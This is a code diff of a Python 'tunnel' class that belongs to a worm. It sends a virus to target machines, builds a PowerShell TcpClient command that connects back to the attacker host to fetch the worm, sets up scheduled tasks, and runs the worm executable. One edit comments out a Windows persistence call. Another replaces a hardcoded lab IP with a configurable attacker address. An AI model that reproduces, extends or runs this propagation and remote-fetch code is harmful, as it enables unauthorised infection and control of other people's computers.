@@ -39,13 +39,13 @@ class tunnel(threading.Thread):
             self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
 
             # start to create persistence proces on windows
-            self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
+            #self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
             
             # close the connection
             conn.close()
 
         except TimeoutError:
-            print("Timeout Error, Possbile on Infection Phrase. Terminate Current Tunnel")
+            print("Timeout Error, Possbile on Infection Phrase - Target Machine BSOD. Terminate Current Tunnel")
     
     
     # handles the send command between the attacker and the target
@@ -182,7 +182,7 @@ class tunnel(threading.Thread):
             print("run powershell")
             print("Target Response: {}".format(self.get_response(conn)))
             command = '$client = New-Object System.Net.Sockets.TcpClient;'
-            command += '$client.Connect("192.168.56.108", 8081); '
+            command += '$client.Connect("'+self.lhost+'", 8081); '
             command += '$stream = $client.GetStream(); '
             command += '$buffer = New-Object byte[] 1024; '
             command += '$receivedBytes = 0; '
@@ -207,15 +207,16 @@ class tunnel(threading.Thread):
             self.sent_command(command,conn)
             time.sleep(3)
             tasks_response = self.get_response(conn,1024)
-
-            #check if the over the schedule tasks if the name alreay exists
             print("Target Response: {}".format(tasks_response))
+            
+            #check if the over the schedule tasks if the name alreay exists
             if "already exists" in tasks_response:
                 command = b'Y'
                 command+=b'\n'
                 self.sent_command(command,conn)
                 tasks_response = self.get_response(conn,1024)
-            print("Target Response: {}".format(tasks_response))
+                time.sleep(2)
+                print("Target Response: {}".format(tasks_response))
             
             #execute the worm on the target machine
             command = "./{}_tworm.exe".format(self.lhost).encode()
